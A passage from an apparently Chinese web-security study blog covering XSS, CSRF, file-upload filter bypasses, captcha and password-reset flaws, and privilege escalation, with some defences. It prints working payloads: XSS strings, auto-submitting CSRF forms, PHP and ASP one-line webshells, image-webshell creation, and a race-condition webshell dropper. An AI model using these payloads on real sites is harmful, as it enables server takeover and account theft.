href=\"#3-字符串过滤\" class=\"headerlink\" title=\"3.字符串过滤\"></a>3.字符串过滤</h3><h3 id=\"4-严格区分用户权限\"><a href=\"#4-严格区分用户权限\" class=\"headerlink\" title=\"4.严格区分用户权限\"></a>4.严格区分用户权限</h3><p>在权限设计中，针对软件用户，没有必要给予数据库的创建、删除等管理权限。这样即便在用户输入的sql语句中含有内嵌式的恶意程序，因为其权限的限定，也不可能执行。所以程序在权限设计时，最好把管理员与用户区别起来。这样能够最大限度的降低注入式攻击对数据库产生的损害。</p>\n<h1 id=\"三、XSS注入——跨站脚本攻击\"><a href=\"#三、XSS注入——跨站脚本攻击\" class=\"headerlink\" title=\"三、XSS注入——跨站脚本攻击\"></a>三、XSS注入——跨站脚本攻击</h1><p>XSS也是注入的一种，属于前端注入</p>\n<p>XSS注入的本质<strong>用户输入的数据会被当做前端js代码执行</strong></p>\n<p>作用：</p>\n<ul>\n<li>XSS最大的作用就是窃取Cookie；</li>\n<li>获取内网ip</li>\n<li>获取浏览器保存的明文面膜</li>\n<li>截取网页屏幕</li>\n<li>网页上的键盘记录</li>\n</ul>\n<p><strong>同源策略：</strong></p>\n<p>同协议；同域名/ip；同端口</p>\n<p>XSS能窃取到的Cookie只能读取当前触发页面同源下的Cookie</p>\n<p><strong>一个ip可能有不同的域名，所以域名与对应的ip不一定是同源的，只有域名对域名，同时ip对ip才是准确同源的。</strong></p>\n<h2 id=\"触发XSS的方法：\"><a href=\"#触发XSS的方法：\" class=\"headerlink\" title=\"触发XSS的方法：\"></a>触发XSS的方法：</h2><ul>\n<li>标签触发：</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;\n弹窗是用来证明是否存在XSS，但是弹窗危害有点大，尽量避免使用。\n例如：\n&lt;script&gt;&lt;&#x2F;script&gt;在留言板等中并没有显示出来；\n或&lt;hr&#x2F;&gt;\t\t&lt;h1&gt;111&lt;&#x2F;h1&gt;\t是否呗当做html代码执行\n但是在真正的项目上面，还是要用弹窗来证明是否存在XSS，或直接打攻击代码窃取cookie</code></pre>\n\n<ul>\n<li>伪协议触发（小众协议）：</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">JavaScript:alert（123）\t\t#javascript就是伪协议，后面的东西就会被当做js代码执行\n需要点击触发，例：\n&lt;a href &#x3D; &quot;javascript:alert(123)&quot;&gt;abc&lt;&#x2F;a&gt;#点击abc才会触发xss</code></pre>\n\n<ul>\n<li>事件触发：</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">满足某种条件自动触发，例：\n&lt;img src&#x3D;&quot;#&quot; onerror&#x3D;alert(1) &#x2F;&#x2F;&gt;\t\t#当此图片没有成功加载的时候会触发弹窗</code></pre>\n\n<p>窃取Cookie：</p>\n<p>需要用到XSS平台，例如：xs.sb</p>\n<h2 id=\"XSS分类\"><a href=\"#XSS分类\" class=\"headerlink\" title=\"XSS分类\"></a>XSS分类</h2><h4 id=\"反射型XSS：\"><a href=\"#反射型XSS：\" class=\"headerlink\" title=\"反射型XSS：\"></a>反射型XSS：</h4><p>非持久型生效的攻击，仅仅作用一次（目标必须主动输出恶意语句）；</p>\n<p>反射型XSS需要进行诱骗，因为别人不会主动传出相同的传参。</p>\n<h4 id=\"存储型XSS：\"><a href=\"#存储型XSS：\" class=\"headerlink\" title=\"存储型XSS：\"></a>存储型XSS：</h4><p><strong>你提交的数据成功实现了XSS，存入了数据库</strong>，别人访问这个页面的时候就会自动触发；</p>\n<p>注意单双引号的闭合，在浏览器中右键检查时，单引号有时会被浏览器渲染成双引号</p>\n<p>存储型xss会出现的地方：</p>\n<p>任何可能插入数据库的地方；但是数据不一定都存储在数据库中 ，如：日志，文件；</p>\n<p>用户注册的时候，商城购买的时候。</p>\n<p>注意：<strong>用户的输入一般控制的很严格；但是系统的获取一般控制的不严格。</strong></p>\n<p>一般来说弹窗很明显，管理员很容易发现，就可以通过传参大量垃圾数据把它覆盖掉。</p>\n<ul>\n<li><h4 id=\"DOM型XSS：\"><a href=\"#DOM型XSS：\" class=\"headerlink\" title=\"DOM型XSS：\"></a>DOM型XSS：</h4></li>\n</ul>\n<p><strong>通过js对网页进行修改的就是DOM型XSS</strong></p>\n<p>js存在的意义就是让更多的工作在访问者自己的电脑中去处理，从而降低对服务器资源的占用。</p>\n<p><strong>DOMXSS的优势：</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">避开waf：\n因为有些情况DOMXSS的payload可以通过location.hash，即设置为锚部分从#之后的部分，既能让js读取到该参数，又不让该参数传入到服务器，从而避免waf检测。location.search也类似，它可以把部分参数放在？之后的部分。\n长度不限：\n这个很重要。\n隐蔽性强：\n攻击代码可以具有隐蔽性，持久性。例如使用Cookie和localStorage作为攻击点的DOMXSS，非常难以察觉，且持续的时间长。</code></pre>\n\n<p>DOMXSS在动态和伪静态页面漏洞相较于静态页面会更多；</p>\n<p>伪静态页面判断：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">在控制台输入;\ndocument.lastModified\t\t#返回的时间会发生改变的就是伪静态页面</code></pre>\n\n<p>DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态的访问和更新文档内容，结构和样式，处理后的结果能够成为现实页面的一部分。</p>\n<p>DOM的三大对象：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">location\ndocument\nwindows\n例：location.hash\t\t#返回锚点之后的值，锚点（#）</code></pre>\n\n<p>DOM型XSS常见的三种状态</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">doucument.write：\ndocument.write在页面上写内容；\ndocument.write支持native编码值。\ninnerHTML：\ninnnerHTML属性设置或返回表格行的开始和结束标签之间的HTML。\neval：\neval把字符串当代吗执行。</code></pre>\n\n<p>在url栏中打XSS可以将js代码进行Unicode编码来进行一些绕过</p>\n<p><strong>注意：编码之后的js不需要进行闭合</strong></p>\n<p>通过XSS去攻击非法网站的时候，通过投诉、找客服说这个站点访问出了一些问题等，将url发给他们让他们访问，网址太长的话可以通过<strong>短链接平台</strong>来缩短网址</p>\n<p>绕过WAF的方法</p>\n<h2 id=\"防范XSS：\"><a href=\"#防范XSS：\" class=\"headerlink\" title=\"防范XSS：\"></a>防范XSS：</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、对Cookie进行防护：\nhttp-only——&gt;防治XSS获取Cookie的东西，禁止Js去读取存储在http-only的cookie。\n2、输入过滤：\n将用户输入的内容进行过滤。对所有用户提交内容进行可靠的输入验证，包括对URL、查询关键字、POST数据等，仅接收指定长度范围内、采用所预期的字符的内容提交，对其他的一律过滤。（客户端和服务器都要）。\n3、输出转义：\n例如：往HTML标签之内插入不可信数据的时候，首先要做的就是对不可信数据进行HTMLEntity编码HTML字符实体。</code></pre>\n\n<h1 id=\"四、CSRF——跨站请求伪造\"><a href=\"#四、CSRF——跨站请求伪造\" class=\"headerlink\" title=\"四、CSRF——跨站请求伪造\"></a>四、CSRF——跨站请求伪造</h1><p>与XSS注入区别：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">CSRF：借用你的Cookie\nXSS：盗取你的Cookie</code></pre>\n\n<p>csrf漏洞的成因：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">说白了就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个站点，都会默认你已经是登录的状态。而在这个时候，攻击者发送了狗仔好的csrf脚本或包含csrf脚本的链接，受害者访问了，就可能会执行一些用户不想做的操作（比如是添加账号等）。</code></pre>\n\n<p>bp可以通过抓取的包直接生成csrf的poc</p>\n<h2 id=\"CSRF危害：\"><a href=\"#CSRF危害：\" class=\"headerlink\" title=\"CSRF危害：\"></a>CSRF危害：</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">发送邮件\n修改账户信息\n资金转账\n盗取用户隐私数据\n网站被上传网马\n作为其他攻击方式的辅助攻击（比如xss）\n传播CSRF蠕虫</code></pre>\n\n<h2 id=\"CSRF分类：\"><a href=\"#CSRF分类：\" class=\"headerlink\" title=\"CSRF分类：\"></a>CSRF分类：</h2><h3 id=\"GET型：\"><a href=\"#GET型：\" class=\"headerlink\" title=\"GET型：\"></a>GET型：</h3><p>这种类型的csrf一般是由于程序员安全意识不强造成的。get类型的csrf利用只需要一个http请求：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;img src&#x3D;http:&#x2F;&#x2F;example.cn&#x2F;csrf.php?xx&#x3D;11 &#x2F;&gt;</code></pre>\n\n<p>在访问含有这个img的页面后，浏览器会自动向</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;example.cn&#x2F;csrf.php?xx&#x3D;11</code></pre>\n\n<p>发送一次http请求。example.cn就会收到包含受害者登录信息的一次跨域请求，所以，如果将该网址替换为存在GET型CSRF的地址，就能完成攻击了。</p>\n<h3 id=\"POST型：\"><a href=\"#POST型：\" class=\"headerlink\" title=\"POST型：\"></a>POST型：</h3><p>这种类型的csrf危害没有get型的打，利用起来通常使用的是一个自动提交的表单，如：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;form action&#x3D;http:&#x2F;&#x2F;example.cn&#x2F;csrf.php method&#x3D;POST&gt;\n&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xx&quot; value&#x3D;&quot;11&quot; &#x2F;&gt;\n&lt;&#x2F;form&gt;\n&lt;script&gt; document.forms[0].submit(); &lt;&#x2F;script&gt;</code></pre>\n\n<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</p>\n<p>POST类型的攻击通常比GET要求更严格一些，但并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端结构不能将安全寄托在仅允许POST上。</p>\n<h3 id=\"链接类型：\"><a href=\"#链接类型：\" class=\"headerlink\" title=\"链接类型：\"></a>链接类型：</h3><p>连接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;a href&#x3D;&quot; http:&#x2F;&#x2F;example.cn&#x2F;csrf.php?xx&#x3D;11&quot; taget&#x3D;&quot;_hacker&quot;&gt;\n      百万福利，点击就送！！\n&lt;a&#x2F;&gt;</code></pre>\n\n<p>结合点击劫持，链接类型会有意外的效果。</p>\n<p><strong>点击劫持</strong></p>\n<p>点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱骗用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的iframe页面。</p>\n<p>通过调整iframe页面的位置，可以诱使用户恰好电机在iframe页面的一些功能性按钮上，比如提交表单。点击劫持需要对页面布局，调整按钮的位置，引导用户点击。隐藏iframe很简单，设置opacity为0，或者将iframe设置成绝对定位，把z-index设置很多，让它处在最上层。</p>\n<h2 id=\"防范csrf的方法：\"><a href=\"#防范csrf的方法：\" class=\"headerlink\" title=\"防范csrf的方法：\"></a>防范csrf的方法：</h2><p>1、cookie设置samesite：</p>\n<p>可以对cookie设置samesite属性。该属性设置cookie不随着跨域请求发送，该属性可以很大程度减少csrf攻击，但是这个属性并不是所有浏览器都兼容。</p>\n<p>2、验证referer:</p>\n<p>我们可以通过验证referer来判断请求是否为第三方网站发起的。</p>\n<p>3、token:</p>\n<p>服务端生成一个token，然后放在页面中，页面提交请求请求的时候，带上这个token。服务端把token从session中拿出，与请求中的token进行对比验证。</p>\n<p>4、验证码:</p>\n<p>由于csrf不会经过受攻击的站点，所以我们可以在网站加入验证码，这样必须通过验证码之后才能进行请求。但是我们不能每个步骤都加上验证码，那样用户体验会很差。</p>\n<p>5、双重cookie:</p>\n<p>利用csrf攻击不能获取到用户cookie的特点，我们可以要求ajax和表单请求携带一个cookie中的值。流程如下：</p>\n<p>用户访问网站时，向请求域名注入一个cookie，内容为一串随机字符串；</p>\n<p>在前端向后端发送请求时，取出cookie，并添加到url的参数中；</p>\n<p>后端结构验证cookie中的字段与url参数中的字段是否一致，不一致则拒绝。</p>\n<p>6、使用最新版的谷歌浏览器</p>\n<p>因为2020年，谷歌浏览器推出强制执行CORS。</p>\n<h1 id=\"五、文件上传漏洞\"><a href=\"#五、文件上传漏洞\" class=\"headerlink\" title=\"五、文件上传漏洞\"></a>五、文件上传漏洞</h1><p>需要了解的：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">webshell：网站权限\n\ngetshell：获取网站权限\n\n反弹shell：受害机器去访问攻击机\n\n正常shell：攻击机连接木马\n\nphp一句话木马：&lt;?php eval($_REQUEST[8]) ?&gt; \t\t#每个编程语言的一句话木马各不相同\n\nphp中反引号&#96;可以执行系统命令，例：\necho &#96;whoami&#96;\t\t#可以查询当前用户权限</code></pre>\n\n<p><strong>前端检测（即客户端检测）等于没有检测</strong>，因为可以禁用js</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">前端校验：一般是在网页上写一段js脚本，用js去检测，校验上传文件的后缀名，有黑名单也有白名单\n\n文件上传时判断是否为前端校验的方法：\n上传文件之前开启抓包工具，上传一个不允许上传的文件，如果弹出不准上传，但是没有抓到数据包，那么就是前端校验。\n\n前端校验非常不可靠，传正常文件然后改数据就可以绕过，甚至关闭js都可以尝试绕过</code></pre>\n\n<p>后端检测（即服务端检测）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">服务端检测几个常见的手段：\n- 检查Content-Type（内容类型）\t\t#这种检测只要改了后缀就可以绕过\n- 检查后缀（检查后缀是主流）\n- 检查文件头\n\n绕过Content-Type和文件头检测，只要通过图片马就可进行绕过\n\n图片马的制作：\n\t写一个一句话木马放在1.txt文件，然后找一个文件大小比较小的图片（越小越好）a.jpg，然后打开cmd，运行下面这条命令\n\tcopy a.jpg&#x2F;b + 1.txt 123.jpg\t\t#（将a.jpg和1.txt合并为123.jpg）\n\n&#x2F;b的意思是以二进制方法进行读取，然后去复合，是为了防止图片破碎\n&#x2F;b也可以用来藏东西：\n\t将1.txt压缩为zip压缩包，然后与a.jpg合成1.jpg；这样将1.jpg打开是一张图片，然后后缀名改为zip再打开的话就是1.txt</code></pre>\n\n<h2 id=\"文件上传绕过\"><a href=\"#文件上传绕过\" class=\"headerlink\" title=\"文件上传绕过\"></a>文件上传绕过</h2><p>1、使用前端验证的</p>\n<p>通过bp抓包，将上传的图片文件后缀jpg改为php就可以。</p>\n<p>2、通过后端Content-type验证</p>\n<p>上传图片马，因为web容器是根据后缀来是被格式的，通过bp抓包改后缀为php即可。</p>\n<h2 id=\"文件上传黑名单绕过\"><a href=\"#文件上传黑名单绕过\" class=\"headerlink\" title=\"文件上传黑名单绕过\"></a>文件上传黑名单绕过</h2><p>1、黑名单，不允许上传.asp/.aspx/.php/.jsp</p>\n<p>默认情况下.php3/.php4/.php5/.phtml都会被解析为php；</p>\n<p>同样的还有.jsp/.jspx/.jspf都会被解析为jsp；</p>\n<p>.asp/.asa/.cer/.aspx会被解析为asp；</p>\n<p>exe/.exee会被解析为exe。</p>\n<p>2、.htaccess文件绕过</p>\n<p>.htaccess全程是Hypertext Access（超文本入口）.htaccess文件也被称为分布式配置文件，是<strong>Apache</strong>服务器中的一个配置文件，提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。</p>\n<p>.htaccess功能：</p>\n<p>文件夹密码保护、用户自定义重定向、自定义404页面、扩展名伪静态化、禁止特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表。</p>\n<p><strong>但是！这个功能默认是不开启的</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</code></pre>\n\n<p>使用：</p>\n<p>写一个文件1.txt，内容为：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">AddType application&#x2F;x-httpd-php .jpg\t\t\t#这个指定代表着.jpg文件会被当做php来解析</code></pre>\n\n<p>然后重命名1.txt文件为.htaccess，如果无法将文件重命名为.htaccess，就使用命令行：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">ren 1.txt .htaccess\t</code></pre>\n\n<p>使用方法是上传图片马之后再上传.htaccess即可。</p>\n<p>3、大小写绕过</p>\n<p>通过大小写PhP来进行绕过，但只适用于非常老版本的web容器，现在的web容器都不区分大小写。</p>\n<p>4、文件后缀(空)绕过：</p>\n<p>在文件名后留一个空格，然后上传上去之后空格会被自动地省略，则黑名单中没有过滤的话，php和php ，就是一样的。</p>\n<p>5、文件后缀(点)绕过</p>\n<p>windows有一个特性，会自动去掉后缀名最后的点“.”</p>\n<p>6、：：DATA（Windows文件流绕过）</p>\n<p>这里利用到了NTFS交换数据流（ADS），ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流。通俗的理解就是，其他文件可以“寄宿”在某个文件身上，而在资源管理器中却只能看到宿主文件，找不到寄宿文件。</p>\n<p>这个方法也可以用来藏东西</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">echo abcd&gt;&gt;a.txt:b.txt\t\t\t#将abcd写入a.txt:b.txt，然后会生成一个a.txt，但是abcd并不会出现在a.txt中，并且a.txt的文件大小是0字节\n然后再试试1.txt::DATA\t\t\t#::$DATA就是默认不修改文件流的情况，NTFS格式文件后面都有$DATA，但是一般不显示\n通过notepad a.txt:b.txt才可以看到刚刚写入的abcd，然后可以这样编辑文件\n通过dir &#x2F;R\t\t\t#就可以看到a.txt:b.txt和1.txt::DATA</code></pre>\n\n<p>使用方法：</p>\n<p>使用bp抓包修改文件后缀为1.php::$DATA，然后上传即可。</p>\n<p>7、点空点绕过</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">php. .</code></pre>\n\n<p>8、通过pphphp绕过</p>\n<p>通过黑名单将黑名单里面出现的都变为空的话，缺乏二次校验的</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">pphphp\t\t\t#首先将第一个遇到的php变为了空，那么pphphp就变成了php</code></pre>\n\n<h2 id=\"文件上传白名单绕过\"><a href=\"#文件上传白名单绕过\" class=\"headerlink\" title=\"文件上传白名单绕过\"></a>文件上传白名单绕过</h2><p>1、%00截断</p>\n<p><strong>00截断只有在PHP5.3.29版本以下才可以使用</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">上传：\n1.php%00.jpg\t\t#有些活驴都是直接匹配字符串，强行匹配到结尾是.jpg后就允许上传，但是php的函数去执行的时候读取到0x00认为结束了，文件就变成了1.php</code></pre>\n\n<p>原理：</p>\n<p>了解%00实际上我们要先了解0x00,0x00实际上是一个16进制表示方式，实际上就是表示ascii码值为0，有写函数在处理这个字符的时候会把这个字符当做结束符，他们就读取到这里认为这一段结束了</p>\n<p>%00实际上和00截断十一摸一样的原理，只不过%00是经过URL编码的，%00解码后就是0x00截断的那个字符。</p>\n<p><strong>0x代表16进制，同时%也代表16进制</strong></p>\n<p>2、通过修改hex</p>\n<p>上传一个1.phpa</p>\n<p>a的ASCII码为61，使用bp抓包，在hex模式下，找到上传的这个a然后修改a所对应的61为00，就可以了。</p>\n<p>有的时候文件上传上去了，但是无法进行解析，就需要配合其它漏洞才能拿下服务器，比如文件包含漏洞</p>\n<p>3、gif图片绕过</p>\n<p>有时浏览器的二次渲染会使图片马中的一句话木马变成其他的东西，从而使图片马失效</p>\n<p>使用gif图片的话，经过二次渲染，gif图片的文件内容有一部分是不会被改变的，我们可以通过上传图片，然后下载下来进行对比发现，一般在有hex模式编译器的第3-4行左右，我们就可以在没有发生改变的这部分写入一句话木马。</p>\n<p>如果木马用不了，很有可能需要配合其它漏洞，例如文件包含解析漏洞</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;upload&#x2F;1.gif&#x2F;.php?a&#x3D;phpinfo();</code></pre>\n\n<p><strong>4、条件竞争</strong></p>\n<p>核心就是：</p>\n<p>文件上传是①先检测还是先上传</p>\n<p>​            还是②先上传，再检测发现不符合，删除</p>\n<p>两种情况都存在，如果是第一种情况就凉凉</p>\n<p>但如果是第二种情况，无论是什么服务器，运算都需要时间，如果我们足够快，就能做到<strong>在文件上传之后还在检测阶段的时候就访问到上传的文件</strong>。</p>\n<p>php函数有写文件的函数，当访问到的时候写文件函数运行了，即使上传的文件被删除了，写文件函数也已经写入了一个木马文件，我们就可以这个使用这个木马文件。</p>\n<p>file_put_contents()：把一个字符串写入文件中。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php file_put_contents(&#39;1.php&#39;,&#39;&lt;?php eval($_REQUEST[8]) ?&gt;&#39;); ?&gt;</code></pre>\n\n<p>上传：</p>\n<p>例如，上传一个图片马，然后查看图片，通过bp抓包改url栏为:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;upload&#x2F;1.php?a&#x3D;&lt;?php file_put_contents(&#39;2.php&#39;,&#39;&lt;?php eval($_REQUEST[8]) ?&gt;&#39;); ?&gt;</code></pre>\n\n<p>然后使用爆破，随便跑一个地方，payload type改为null payloads，次数10000次，options中number of threads为15</p>\n<p>访问：</p>\n<p>访问的包</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;upload&#x2F;2.php?8&#x3D;phpinfo()</code></pre>\n\n<p>然后两遍同时开始跑包，当生成新木马，然后访问到就行。</p>\n<h2 id=\"文件上传解析漏洞\"><a href=\"#文件上传解析漏洞\" class=\"headerlink\" title=\"文件上传解析漏洞\"></a>文件上传解析漏洞</h2><p>如果某个站点，上传了php没有用或无法上传的时候，可以尝试下其他脚本语言；IIS一般来说都是默认支持asp的。</p>\n<p><strong>web容器是可以创建任意后缀的</strong></p>\n<p>对于网站来说，文件是怎么处理的都是由后缀决定的。解析漏洞算是黑名单的绕过。</p>\n<h3 id=\"IIS6-0畸形解析漏洞\"><a href=\"#IIS6-0畸形解析漏洞\" class=\"headerlink\" title=\"IIS6.0畸形解析漏洞\"></a>IIS6.0畸形解析漏洞</h3><p><strong>winserver 2003默认自带IIS6.0</strong></p>\n<p>winserver 2008自带7.0</p>\n<p>win 2016自带10.0</p>\n<p>asp的一句话木马：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;%eval request(&quot;a&quot;)%&gt;</code></pre>\n\n<h4 id=\"①配置错误\"><a href=\"#①配置错误\" class=\"headerlink\" title=\"①配置错误\"></a>①配置错误</h4><p>asa/cer/cdx会被当做asp解析</p>\n<p>上传一个asp图片马，用bp改后缀名为asa，访问文件地址，用?a=a()看是和否报错来判断木马是否有效，当然用菜刀更直接。</p>\n<h4 id=\"②分号截断\"><a href=\"#②分号截断\" class=\"headerlink\" title=\"②分号截断\"></a>②分号截断</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">x.asp;.jpg</code></pre>\n\n<p>IIS会认为这是一个asp文件，解析分号相当于结束，这里的分号类似于00截断</p>\n<p>IIS5.1和7.5都没有这个漏洞</p>\n<h4 id=\"③文件夹名影响\"><a href=\"#③文件夹名影响\" class=\"headerlink\" title=\"③文件夹名影响\"></a>③文件夹名影响</h4><p>在IIS6.0中，文件夹名如果是x.asp的话，那么这个文件夹下面的任意文件都会作为asp来执行。</p>\n<p>FCK编辑器或者是后台有很多功能——&gt;可以移动文件，创建目录。</p>\n<p>IIS7.5及以上的，若没有关闭报错的话，会爆出它的绝对路径。</p>\n<h3 id=\"CGI解析漏洞\"><a href=\"#CGI解析漏洞\" class=\"headerlink\" title=\"CGI解析漏洞\"></a>CGI解析漏洞</h3><p>使用范围：</p>\n<p><strong>只有php语言可以使用</strong>，中间件任意，IIS7.5/7.0或者Nginx都行</p>\n<p>利用：</p>\n<p>上传php图片马之后，访问图片地址，然后url后面加上/.php，图片就会被解析成php，进而就可以进行传参。</p>\n<p>判断：</p>\n<p>找到这个网站中的某张图片，然后/.php，如果乱码了，则存在CGI解析漏洞，找到上传点就可以getshell。</p>\n<p>其实getshell的方法有很多，不止上传文件，例如：</p>\n<p>1、备份数据库，修改数据库名</p>\n<p>在一些比较老的CMS里，备份数据库文件的名字可以自定义，数据库里写一个小马的数据，然后备份文件名字改为xxx.asp就可以解析。</p>\n<p>2、后台功能强大，可以新建文件</p>\n<p>有些编辑器，他们可以改变上传文件的配置。</p>\n<p>若拥有执行SQL语句的能力，可用select 1 into dumpfile ‘c:/1.txt’来写东西到文件内。</p>\n<h1 id=\"六、验证码绕过、密码找回漏洞\"><a href=\"#六、验证码绕过、密码找回漏洞\" class=\"headerlink\" title=\"六、验证码绕过、密码找回漏洞\"></a>六、验证码绕过、密码找回漏洞</h1><h2 id=\"验证码的作用\"><a href=\"#验证码的作用\" class=\"headerlink\" title=\"验证码的作用\"></a>验证码的作用</h2><ol>\n<li><p>第一种可以防止：恶意破解密码、刷票、论坛灌水。</p>\n</li>\n<li><p>第二种验证码就是验证你身份的验证码。例如：邮箱验证码、短信验证码，而且短信验证码是要钱的，网站需要付钱。</p>\n</li>\n</ol>\n<p>验证码绕过漏洞属于逻辑漏洞，它的问题不存在于代码，而是开发者的逻辑错误</p>\n<p>绕过验证码方法：</p>\n<p>1.利用逻辑漏洞绕过法</p>\n<p>2.利用图片识别</p>\n<p>撞库：注册了A网站，也注册了B网站，当两个网站的密码相同时就叫撞库。</p>\n<h2 id=\"验证码绕过常见姿势\"><a href=\"#验证码绕过常见姿势\" class=\"headerlink\" title=\"验证码绕过常见姿势\"></a>验证码绕过常见姿势</h2><ol>\n<li>前端验证验证码，并没有后端验证。直接抓包然后进行爆破；</li>\n<li>验证码设置了但是并没有校验，随便输入验证码也能够成功登录；</li>\n<li>验证码<strong>可以重复利用</strong>，比如现在的密码是1111，然后虽然登录失败后验证码会变，但是你输入的1111却能判定验证码正确；</li>\n<li>验证码空值绕过，比如，我们现在抓一个包，发现登录参数是user=admin&amp;password=admin&amp;yzm=4123。yzm验证码参数，但是我们如果去掉yzm的传参就可以绕过验证码机制，直接传参user=admin&amp;password=a                              dmin，验证码就失效了；</li>\n<li>验证码干扰过低，可以轻松使用脚本识别；</li>\n<li>验证码会在HTML页面输出；</li>\n<li>验证码有规则，比如是时间戳的后6位（rand函数进行随机数）；</li>\n<li>有万能验证码，验证码无论是什么，只要输入000000就能直接绕过；</li>\n<li>验证码有的时候会藏在cookie里面，分析一下是不是存在验证码的参数；</li>\n<li>图片验证码，类型太少，容易识别</li>\n</ol>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">滑动验证码，session参数重复校验\n\n漏洞说明：\n\n这种类型的漏洞出现几率比较低，属于滑动验证码设计缺陷。\n\n从漏洞定义角度来讲，属于“验证码爆破”，同样是通过遍历数值，当达到正确的数值后就可以通过验证。\n\n攻击手法：\n\n需要抓取多个数据包，包括开头和结尾的数据包，从而来确定数据包范围，以及数据包数值。\n\n通常为长度数值为0-200的整数。具体以实际数据包为准。\n\n修复方式：\n\n不管验证码是不是输入正确，都应该及时销毁验证码。</code></pre>\n\n<p><strong>验证码绕过只有登录成功的时候它才是一个漏洞</strong></p>\n<h2 id=\"密码找回漏洞\"><a href=\"#密码找回漏洞\" class=\"headerlink\" title=\"密码找回漏洞\"></a>密码找回漏洞</h2><ol>\n<li>验证码发送后前端返回</li>\n<li>验证码无次数限制可爆破</li>\n<li>验证码可控</li>\n<li>直接修改密码页面</li>\n<li>越权漏洞_&gt;自己验证码通过改包然后修改别人的密码</li>\n</ol>\n<h1 id=\"七、越权\"><a href=\"#七、越权\" class=\"headerlink\" title=\"七、越权\"></a>七、越权</h1><p>越权访问：</p>\n<p>这类漏洞是指引用在检查授权时存在纰漏，使得攻击者在获得低权限用户账号后，可以利用一些方法绕过权限检查，访问或者操作到原本无权访问的高权限功能。与未授权访问有区别。</p>\n<p>未授权访问就是直接通过网址就可以直接访问的一些本不能给用户访问的网页；有时通过目录爆破可以得到这样的页面。</p>\n<p>越权分为：</p>\n<p>水平越权/横向越权：相同权限下不同的用户可以互相访问</p>\n<p>垂直越权/纵向越权：使用权限低的用户可以访问到权限较高的用户</p>\n<p>交叉越权：用户既可以访问相同权限的，也可以访问高权限的。</p>\n<p>越权漏洞也是逻辑漏洞，用漏扫工具是扫不出来的。</p>\n<p>测试过程：</p>\n<p>使用bp抓包将传参ID修改为其他用户，如果成功查看或者修改了同权限其他用户的信息就属于水平越权，如果可以影响到高权限用户就是垂直越权</p>\n<p>传参ID参数需要自己检测（常见：uid= id= user= 等）通常使用burp进行爆破传参<strong>（传参可能在get、post、cookie</strong>）。</p>\n<h1 id=\"八、SSRF——服务器端请求伪造\"><a href=\"#八、SSRF——服务器端请求伪造\" class=\"headerlink\" title=\"八、SSRF——服务器端请求伪造\"></a>八、SSRF——服务器端请求伪造</h1><p>SSRF：是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统（正因为它是由服务端发起的，所以它能够请求到与它相连而域外网隔离的内部系统）。<strong>就是控制目标站点去访问其他网站 。</strong></p>\n<p>形成的原因：</p>\n<p>大都是由于服务端提供了从其它服务器应用获取数据的功能且没有对目标站点做过滤与限制。比如从指定 URL地址获取网页文本信息，加载指定的图片，下载等等。</p>\n<p>注意：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip的端口是否开放服务，只不过该危害比较小而已。</p>\n<h2 id=\"可能出现的地方\"><a href=\"#可能出现的地方\" class=\"headerlink\" 